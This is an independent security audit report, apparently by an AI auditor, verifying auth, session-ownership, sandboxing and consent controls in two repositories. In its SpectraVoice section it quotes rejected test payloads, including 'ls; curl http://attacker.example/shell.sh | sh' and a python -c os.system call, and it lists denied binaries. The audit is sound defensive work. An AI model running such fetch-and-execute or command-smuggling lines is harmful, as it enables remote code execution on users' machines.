# Independent Audit — Research_Forge & SpectraVoice (delivered state)

**Auditor:** Obvious Fusion (independent second-eyes audit, read-only)
**Date:** 2026-09-17
**Claim sources:** Master Plan `art_gwXo54Vz` (Wave 0/1/2 acceptance criteria); Research_Forge survey `art_2Hi9nExY`; SpectraVoice survey `art_BVfU87TR`
**Audited commits:** Research_Forge `origin/main` = `0e140c2ff59f872286bb25d63188a00387d9900d` (W2 merge commit, PR #4); SpectraVoice `origin/main` = `1f6247babafc9d4aa977e6f95058afb07786c77c`
**Method:** every check verified directly on `origin/main` in code — grep of route registrations, reading of enforcement code paths and test bodies, `git grep` over tracked config, `gh run list` for CI. Nothing was taken from reports or PR descriptions without code confirmation. No files were edited, nothing pushed, no PR comments, no CI triggered.

---

## REPO A — nihanthnaidu007/Research_Forge @ `0e140c2`

### A1. Auth dependency on every route, including W2 history/export/outline-update — PASS

All routes are registered on a single `APIRouter` and included once (`app.include_router(api_router)`, backend/server.py:1252). Route-by-route (`backend/server.py` @ 0e140c2):

| Route | Line | Guards |
|---|---|---|
| GET `/` | 241 | `require_api_key` |
| GET `/health` | 254 | intentionally open (see note below) |
| POST `/run` | 299 | `require_api_key` + 10/min rate limit |
| GET `/session/{id}/status` | 754 | `require_api_key` |
| GET `/session/{id}` | 793 | `require_api_key` |
| GET `/history` | 803 | `require_api_key` |
| GET `/session/{id}/stream` | 818–821 | `require_api_key` + `require_session_ownership` |
| POST `/approve-outline` | 882–885 | `require_api_key` + `require_session_ownership_body` |
| POST `/upload-pdf` | 983 | `require_api_key` + 30/min rate limit |
| POST `/export-pdf` | 1106–1109 | `require_api_key` + `require_session_ownership` |
| POST `/export-markdown` | 1151–1154 | `require_api_key` + `require_session_ownership` |
| POST `/export-html` | 1180–1183 | `require_api_key` + `require_session_ownership` |
| PUT `/session/{id}/outline` | 1211–1214 | `require_api_key` + `require_session_ownership` |

No route was found without `require_api_key` except `/health`, which is explicitly documented as the single exception (backend/auth.py:6–7: "required on every route except /api/health") and asserted open by test (`test_health_stays_open_without_api_key`, backend/tests/test_auth.py:84–96). The W2 endpoints (history, export-markdown, export-html, outline update) are guarded at server.py:803, 1151–1154, 1180–1183, 1211–1214.

`require_api_key` itself fails closed: unset/empty `RESEARCHFORGE_API_KEY` ⇒ 503 on every protected route (auth.py:41–49); constant-time comparison via `secrets.compare_digest` (auth.py:26–28); accepts `X-API-Key` or `Authorization: Bearer` (auth.py:31–39).

### A2. Per-session ownership on stream / approve-outline / PDF / Markdown / HTML export — PASS

- Path-based routes use `require_session_ownership` (backend/auth.py:109–123), which resolves the token from the `X-Session-Token` header or `session_token` query param and calls `enforce_session_ownership`.
- Body-based route (`/approve-outline`) uses `require_session_ownership_body` (server.py:228–235), extracting `session_id` from the request body before the same enforcement.
- `enforce_session_ownership` (auth.py:87–106): **401** when no token presented, **404** when the session has no stored token hash (pre-token sessions fail closed), **403** on constant-time comparison failure of SHA-256 hash (auth.py:60–67 hash-on-write; plaintext returned exactly once in the `/run` response, server.py:417–429).
- Applied at: stream server.py:820, approve-outline server.py:884, export-pdf server.py:1108, export-markdown server.py:1153, export-html server.py:1182.

**Observation (hardening headroom, not a criterion breach):** `GET /session/{id}` (server.py:793–799), `GET /session/{id}/status` (server.py:754–790), and `POST /upload-pdf` into an *existing* session (server.py:983) are API-key-only without a session token. This matches the documented scope in auth.py:8–13 ("the session SSE stream, outline approval, and PDF download" — markdown/HTML export were added to the token layer in W2) and is defensible for the plan's single-operator threat model (master plan load-bearing assumption) since session IDs are `uuid4` (server.py:326) and unguessable. If the deployer ever exposes the API key to a second party, these three reads/writes become the first places to add token enforcement.

### A3. Global concurrency cap + per-run token budget at pipeline start — PASS

- **Cap:** `MAX_CONCURRENT_RUNS` (default 3, positive-int parsed from env) with a global `asyncio.Semaphore` (server.py:1317–1322). `acquire_run_slot()` rejects with **429 + `Retry-After: 30`** at capacity (server.py:1326–1341). Acquired in `POST /run` before session creation (server.py:360) and in `/approve-outline` before resuming the graph (server.py:954); released in `except`/`finally` paths at server.py:379, 548, 751, 973. Both initial runs and post-approval resumes hold a slot (comment at server.py:1319–1321).
- **Budget:** `token_budget.ensure_budget(session_id)` at both pipeline start points — `run_graph_async` (server.py:404) and the resume path (server.py:567). `RUN_TOKEN_BUDGET` parsed from env; empty/0/invalid ⇒ unlimited (utils/token_budget.py:56–64). Usage is recorded where tokens are actually spent: the shared OpenAI wrapper `chat_completion_with_usage` records `response.usage.total_tokens` per call (utils/clients.py:55–70) and **all five LLM-calling agents use it** — document.py:144, factcheck.py:38, factcheck_parallel.py:65, outline.py:97, synthesis.py:153 (research.py and citations.py make no LLM calls). Crossing the ceiling raises `TokenBudgetExceeded` (token_budget.py:44–53), caught at server.py:506 and 709, marking the session `error` with a client-safe message ("Report generation stopped: the token budget for this run was exhausted…"). Budget is scoped per graph-execution phase and released at phase end (token_budget.py:66–74; release seen at server.py:750–751).

### A4. Error paths return sanitized messages — PASS

- Export endpoints log `str(e)` server-side but return generic client details: 400 "PDF generation failed — invalid report state" / 500 "PDF generation failed — check server logs for details" (server.py:1137–1147), same pattern for Markdown (1162–1168) and HTML (1191–1197).
- Graph failures set sanitized state text: timeout ⇒ "Report generation timed out after Ns…" (server.py:447–460 region), token budget ⇒ message quoted in A3.
- **Tests assert the negative:** backend/tests/test_error_sanitization.py:18–34 (initial run) and 37–51 (resume) force an exception carrying "boom"/"leaked detail" and assert the client-visible error starts with "Report generation failed due to an internal error", contains a reference ID, and contains **neither** the raw exception text nor the leaked detail.

### A5. No hardcoded personal URLs or credentials in tracked config — PASS

`git grep` over tracked files for Postgres DSNs, `sk-` keys, inline API keys, and personal identifiers (name, gmail.com) surfaced only dev-local placeholders: a commented-out local DSN in docker-compose.yml:37, `backend/.env.example`'s local DSN matching the compose Postgres, and the Vite **dev** proxy target `http://localhost:8000` (frontend/vite.config.js:19). `backend/.env.example` ships with empty key fields and documents every variable including the auth key (generation command included) and both cost controls. No personal Railway URL or real credential is tracked.

### A6. Negative 401/403 tests that execute the guard — PASS

- **test_auth.py:** parametrized over 8 route families (root, run, status, details, stream, approve, upload, export-pdf — test_auth.py:12–33) asserting missing key ⇒ **401** (37–40), wrong key ⇒ **401** (43–48), key unset ⇒ **503 fail-closed** (51–58). Ownership cases assert missing token ⇒ **401**, wrong token ⇒ **403**, correct token ⇒ pass, query-param token accepted (101–140). These run through `TestClient` against the real app with the real dependency stack (conftest.py imports `server` and stubs only db/graph/providers).
- **test_history.py:** `test_history_requires_api_key` (401) and `test_history_rejects_wrong_api_key` (401), lines 6–13.
- **test_export_formats.py:** Markdown/HTML without key ⇒ 401 (64–73), without token ⇒ 401 (76–89), wrong token ⇒ **403** (92–99).
- **test_outline_update.py:** no key ⇒ 401 (35–38), no token ⇒ 401 (41–48), wrong token ⇒ **403** (51–58).
- The guards are genuinely exercised: 401/403s are produced by the same `require_api_key` / `enforce_session_ownership` functions installed on the routes (A1/A2), not by stubs.

### A7. CI — PASS

`gh run list --branch main`: latest run `35261289959` (the `0e140c2` W2 commit) **success**, as were the two prior W1/W0 commits (runs `35256272431`, `35254567621`) — all on 2026-09-17.

### Claim-vs-code drift (Research_Forge)

None material. Two wording notes, neither a substance breach:

1. **Claim (master plan W2):** "remove the dead `factcheck.py`/`factcheck_parallel.py` duplicate." **Code reality:** the dead **sequential** factcheck implementation (`factcheck_node`, `judge_single_claim`) was removed inside the modules; the parallel Send()-based path remains as the production implementation, imported at graph/graph.py:19–20 (`extract_claims_from_research`, `factcheck_single_node`). Grep confirms no callers of the removed sequential node remain. The deduplication the criterion asked for happened; the plan's file-level naming was looser than the correct implementation-level cut. The W2 commit message documents exactly this scoping ("extract_claims_from_research is still used by the live fanout path and stays").
2. **Observation 1 in A2** (three API-key-only session endpoints) is worth stating in delivery notes, but it matches the documented auth scope in the code itself and the plan's single-operator definition, so it is not drift against the acceptance criteria.

### REPO A VERDICT: **INDEPENDENTLY CONFIRMED** — all six audit checks verified on `origin/main` at `0e140c2` with CI green; only hardening-headroom observations, no claim-vs-code drift.

---

## REPO B — nihanthnaidu007/SpectraVoice @ `1f6247b`

### B1. argv-only execution, no `shell=True`; deny list rejects `ls; curl|sh` and `python -c` — PASS

- `build_sandbox_argv` (src/assistant_app/tools/command_sandbox.py:167–204) returns an argv **list**: raw payload first scanned for shell metacharacters (`;`, `|`, `&`, backtick, `$`, `(`, `)`, `<`, `>`, newlines, NUL — command_sandbox.py:33–35, checked before parsing so quoted metacharacters are also refused), then `shlex`-tokenized, then the first token must be a bare name in `ALLOWED_BINARIES` (no path separators ⇒ `/bin/zsh` and `./evil` cannot smuggle a binary, command_sandbox.py:131–142), then every argument validated against per-binary styles (flags, numerics, subcommands, safe relative non-hidden paths — command_sandbox.py:117–128) with code-execution flags denied by name (`find -exec/-execdir/-ok/-okdir/-delete/-f/-fprintf`, command_sandbox.py:96–103). `python`, `curl`, `osascript`, `pip`, `npm`, `node`, `brew`, `open` are deliberately absent from the allowlist (command_sandbox.py:44–46; asserted by tests at tests/test_command_sandbox.py:128–130).
- **Execution path:** the only caller is `ToolExecutor._handle_run_command` (src/assistant_app/tools/tool_executor.py:981–1040): defense-in-depth blocklist on the raw payload, then `build_sandbox_argv`, then `subprocess.run(argv, capture_output=True, text=True, timeout=min(timeout, max_command_timeout), cwd=~)` — **no `shell` argument** (defaults to False). `grep -rn "shell=True"` across `src/`, `main.py`, `scripts/` matches only the docstring describing the *old* design (command_sandbox.py:4,10). The two other `subprocess.Popen` sites (indicator window io/indicator.py:322–327; supervisor src/assistant_app/supervisor.py:182–187) both pass argv lists, no shell — neither is on the run_command path.
- **Tests assert rejection:** tests/test_command_sandbox.py parametrizes `ls; curl http://attacker.example/shell.sh | sh` and `ls && curl … | sh` (lines 35–36), `python -c 'import os; os.system("id")'` (43), bare `curl` (46–47) and asserts `build_sandbox_argv` raises (52–54); `test_python_c_rejected_by_allowlist` (57–61). Executor-level: `test_executor_rejects_bypass_payload` runs `ls; curl … | sh` through the full `ToolExecutor.execute` path and asserts failure with a sandbox error (157–161); `test_executor_passes_argv_without_shell` mocks `subprocess.run` and asserts the command was executed as an argv list with `shell` not true (144–154).

### B2. Consent gate actually blocks screenshot upload when disabled — PASS

- Gate: `PrivacyConsent` (src/assistant_app/core/consent.py) — `SPECTRAVOICE_SCREEN_CONSENT` env opt-in, **default OFF** (lines 15, 37–40, 42–45); `screen_upload_allowed` = consented AND not paused (47–50); independent runtime pause kill-switch (73–76); thread-safe (lock on every read/write).
- **Enforcement is in the send path, not the flag:** `Assistant.process` checks the gate before any provider call and, when blocked, never passes the screenshot onward — it falls back to `process_text_only(prompt)` (src/assistant_app/core/assistant.py:161–172, logged as "screenshot NOT sent to the LLM provider"). Wiring: `PrivacyConsent.from_env()` is constructed in spectravoice_assistant.py:104–112 and injected into the Assistant.
- **No side doors:** the only two producers of screen bytes (`screen_capture.get_encoded()` at spectravoice_assistant.py:287 and :427) both feed `self.assistant.process(...)` — the gated method. `smart_click` uses screenshots for **local** pixel-difference verification only (tools/smart_click.py:268–276, no provider call); `gui_selector` handles no images; the `take_screenshot` *tool* writes a local PNG to `~/Desktop/Screenshots` (tool_executor.py:1126–1146) and does not return image data into the provider conversation.
- **Tests assert the block at provider level:** tests/test_privacy_consent.py:77–82 — with consent off, a fake provider counts `vision_calls == 0` and `text_calls == 1`; pause blocks despite granted consent (102–111); resume without consent stays blocked (113–117); env parsing (120–136); concurrency (139–155).

### B3. Bounded crash-loop guard — PASS

`Supervisor.run` (src/assistant_app/supervisor.py:91–141) keeps a `deque` of crash timestamps; crashes outside `window_seconds` age out. When **more than `max_restarts` crashes occur within the window** it logs critical and **returns 1** — an infinite crash loop terminates supervision instead of thrashing. Defaults (`RestartPolicy`, supervisor.py:52–60): **max_restarts = 5, window_seconds = 60**, exponential backoff 1s doubling, capped at 30s. User interrupts (SIGINT/SIGTERM, incl. 128+N shell forms) are not crashes and end supervision with the child's status (supervisor.py:47–49, 113–117). Tests: `test_gives_up_after_max_restarts` (tests/test_supervisor.py:107+), restart-events-logged (95–105), restart-until-success (84–93).

### B4. `--doctor` headless, per-permission state — PASS

`python main.py --doctor` (usage line main.py:20) runs src/assistant_app/doctor.py: headless diagnostics that never start the assistant (docstring lines 2–14). Probes and per-item states: **Microphone** (AVFoundation status query with PyAudio open fallback, doctor.py:99–141), **Screen Recording** (Quartz preflight / ImageGrab fallback, 144–172), **Accessibility** (`AXIsProcessTrusted()`, 174+), plus environment checks (OpenAI key, Ollama reachability, Tavily key, config) each returning PASS/FAIL/WARN/SKIP with a **fix-it hint and deep link** to the relevant macOS System Settings pane (doctor.py:73–87). On non-macOS (Linux CI) permission probes return a SKIP outcome instead of failing (90–96) — asserted by `test_permission_probes_skip_and_exit_zero` (tests/test_doctor.py:90–96, all three permission states SKIP). Exit codes tested: pass ⇒ 0, fail ⇒ 1 with "Fix:" link printed, warn/skip ⇒ 0, probe exception degrades to WARN (tests/test_doctor.py:44–78).

### B5. `.env.example` and `.gitignore` — PASS

Both tracked at repo root. `.gitignore`: `.env`, `.DS_Store`, `__pycache__/` + `*.py[cod]`, venvs, `logs/`/`*.log` (rotating runtime logs), pytest/ruff caches. `.env.example`: placeholder `OPENAI_API_KEY="your_openai_api_key_here"`, empty optional `TAVILY_API_KEY`, provider pin hint, and the screen-consent variable documented as default-OFF — with a "never commit your real .env" note. Bonus check per the W0 claim: Whisper is pinned to a release tag — `openai-whisper==20250625` (requirements.txt); macOS-only ObjC deps carry `sys_platform == "darwin"` markers so Linux CI stays installable.

### B6. CI — PASS

`gh run list --branch main`: latest run `35261856650` (the W2 `--doctor`/supervisor commit) **success**, as were the W1 (config/streaming TTS) and W0 (sandbox/consent) commits — all on 2026-09-17.

### Claim-vs-code drift (SpectraVoice)

None found. Every Wave 0/1/2 claim traced to enforcing code and asserting tests: sandbox (B1), consent + pause toggle (B2), rotating file logging + crash capture (referenced by supervisor wiring, supervisor.py:1–20, and tests/test_logging_crash.py present in the suite), bounded restart (B3), doctor (B4), hygiene files + Whisper pin (B5).

### REPO B VERDICT: **INDEPENDENTLY CONFIRMED** — all five audit checks verified on `origin/main` at `1f6247b` with CI green; no claim-vs-code drift.

---

## Overall

| Repo | Verdict |
|---|---|
| Research_Forge @ `0e140c2` | **INDEPENDENTLY CONFIRMED** (2 non-blocking observations: 3 API-key-only session endpoints; master-plan W2 wording vs implementation-level dead-code cut) |
| SpectraVoice @ `1f6247b` | **INDEPENDENTLY CONFIRMED** (no drift) |

The delivered state matches the acceptance criteria as written. The single recommendation for the delivery dossier: record the Research_Forge observation (A2) as known hardening headroom if the deployment model ever moves beyond a single trusted operator.
